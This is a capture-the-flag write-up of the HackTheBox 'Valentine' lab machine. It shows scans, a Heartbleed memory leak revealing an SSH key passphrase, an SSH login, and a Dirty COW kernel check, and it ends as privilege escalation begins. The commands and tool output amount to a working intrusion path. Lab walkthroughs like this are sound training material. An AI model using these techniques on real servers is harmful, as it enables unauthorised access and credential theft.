# Valentine on HackTheBox
------
## 10th August 2018
------
![Image of Valentine](https://i.imgur.com/8HVRNyG.jpg)
### Introduction

Valentine was a extremely fun box for me which I would say is aimed at Beginner - Intermediate. If you are aware of industry recognised exploits & particularly exploits that are famous within the InfoSec community you will probably blitz straight through it in half an hour. Nevertheless it was a great box. 

Ps: If you do not know what HackTheBox is it is a Free/Paid resource found [Here](http://hackthebox.eu) which offers you a lab network littered with intentionally vulnerable boxes (Desktops, Servers, Web Applications, Domain Controllers etc) It really has so much to offer. 

Lets begin. 

## Enumeration - Initial

To kick off my enumeration I started it off as I usually do with a simple ```nMap``` Top 100 Ports Scan using the following syntax

``` nMap -A -verbose 4 10.10.10.79 ```
- The ``` -A ``` flag tells nMap to use aggresive scanning which bundles Service Detection & OS Detection into one. (Not necessary but I like to use it)
- The ``` -verbose 4 ``` sets the verbosity of the scan to 4 which provides me more information than a normal scan in real-time. (Highly useful if scanning all ports & need updates in real-time and not once the scan has finished) 


I also ran ``` nMap -A -p- -verbose 4 10.10.10.79 ``` which scanned all ```65,535``` TCP Ports however I will not show the output of this as the Top 100 ports output is all we need.

From the above nMap Scan we gather 3 ports of interest ```22 (SSH)```, ```80 (http)``` & ```443 (SSL/HTTPS)``` - Anytime I see Port 80 open on a box I immediately visit the box inside a web browser to see what is being hosted on the web server. 

In this case upon visiting ```http://10.10.10.79:80``` I was greeted a page with an image (The one above) I tried doing some Steganography on the image but it wasn't hiding anything - Boring! Time to enumerate this web server further...

### Enumeration - Dirb

As I have recently discovered that the server is running apache, It was fairly obvious to me that there may be a vulnerable web application somewhere that I had to find. I decided to use the handy tool ```dirb``` which can be parsed a wordlist containing known directory names and scan the web server... 

I kicked ```dirb``` off with the following syntax ``` dirb http://10.10.10.79``` This will automatically use the common.txt wordlist that comes with ```dirb```. I like to start with common.txt and if it finds nothing I can create custom wordlists depending on the nature of the box.

Luckily for me this time ```common.txt``` was more than enough and succesfully informed of directories on the server which could take me further. 
``` DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jul 23 09:04:48 2018
URL_BASE: http://10.10.10.79/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.79/ ----
+ http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)                                                      
+ http://10.10.10.79/decode (CODE:200|SIZE:552)                                                        
==> DIRECTORY: http://10.10.10.79/dev/                                                                 
+ http://10.10.10.79/encode (CODE:200|SIZE:554)                                                        
+ http://10.10.10.79/index (CODE:200|SIZE:38)                                                          
+ http://10.10.10.79/index.php (CODE:200|SIZE:38)
```

Very interesting, now I do not want to blabber on for ages about what was happening on each page but here's a breakdown of each page & directory.

* ``decode`` PHP Utility that decoded any Base64 String 
* ``encode`` PHP Utility that encoded any Base64 String 
* ``dev(directory)`` This was where I found something interesting... Inside the dev directory there was 2 things.
* 1. Notes.txt
* 2. hype_key

As you can see in the notes.txt screenshot it appears as if the decode/encode application running on the web server handles everything __server-side...__ as well as notes.txt we also discovered `hype_key`. Upon opening hype_key we are presented with a `hex` string. I used the following [website](http://www.convertstring.com/EncodeDecode/HexDecode) to convert `hex` to `text`. 

Upon succesfully converting the `hex` string I was greeted with an SSH Private Key - Woo! Maybe I could use this to SSH into Valentine?

### Enumeration - SSL

Now I have gathered the above information regarding Port `80` I decided to carry out some further enumeration on Port `443`, Upon visiting `http://10.10.10.79:443` my connection was dropped which in turn left me thinking it was a dead-end before my buddy gave me a little hint to enumerate it further ;) 

I decided to utilise a tool that comes with `kali` called `sslscan` - It is a great lightweight tool that is always worth running against a box with `HTTPS` open. 

```
root@kali:~/Desktop/Scripts/Valentine# sslscan 10.10.10.79
Version: 1.11.10-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 vulnerable to heartbleed
TLS 1.1 vulnerable to heartbleed
TLS 1.0 vulnerable to heartbleed
````

Pay attention to the last 3 lines __vulnerable to heartbleed__ - Great! Perhaps we can exploit the famous heartbleed vulnerability to read the memory on the server. 


## Exploiting - Piecing the Pieces Together!

Before we begin exploiting lets first talk about the `heartbleed` vulnerability we just discoverved the server is vulnerable too. The heartbleed bug was a critical vulnerability in the OpenSSL libary which can allow an attacker to read data from the server-memory which should be protected. 

Perhaps we can use heartbleed to read the server memory and intercept any encoding/decoding happening __server-side__.

I decided to use [this](https://gist.github.com/eelsivart/10174134) python script to exploit heartbleed rather than metasploit as I try my best to do everything manually or at least to not use metasploit.

I ran `heartbleed.py` with the following syntax `python heartbleed.py 10.10.10.79` - which returned the below output. *(One thing worth noting I actually had to run this script 10-15 times before getting the output I was after)*

```
root@kali:~/Desktop/Scripts/Valentine# python heartbleed.py 10.10.10.79

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################

.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.j..!.)p.8.&...AL
```

Woohoo! As you can see I intercepted a string being encoded server side and was able to capture the following Base64 string `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` - After a quick decode I was left with the following `heartbleedbelievethehype`

### Exploiting - Logging in / First Shell

Now I had the `heartbleedbelievethehype` password I quickly noticed a common recurrence of the word `hype` - I had a stab in the dark by trying to SSH into Valentine with the below syntax

`ssh -i hype_keydecoded.txt hype@10.10.10.79`
Upon running this command I was prompted for a passphrase for the account... Easy `heartbleedbelievethehype`

Perfect! I was now logged into Valentine as the user hype and able to capture the User Flag! 

Time to try escalate privileges and take over the whole machine. 

## Privilege Escalation - Further Enumeration!

As always one of the first things I do after logging into a linux machine as a limited user besides having a general snoop around is run `linuxprivchecker.py`.

LinuxPrivChecker.py is a great python script that enumerates the system overall and provides us a vast array of information that may help us to escalate privileges. 

I transferred LinuxPrivChecker to `/tmp` on Valentine using `python -m SimpleHTTPServer` & `wget`. 

From here it was as simple as running `Chmod 777` against `linuxprivchecker.py` and running it with `python linuxprivchecker.py > results.txt` - This saved the results of LinuxPrivChecker to a results.txt for later consultation. (*I am not going to share the full results of LinuxPrivChecker here as it is very long*.)

### Privilege Escalation - Dirty Cow / Method #1 

After I ran LinuxPrivChecker something immediately jumped out at me : 
* `Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012`

This kernal certainly looks vulnerable to the famous Dirty Cow that effected most Linux Systems when first release. 

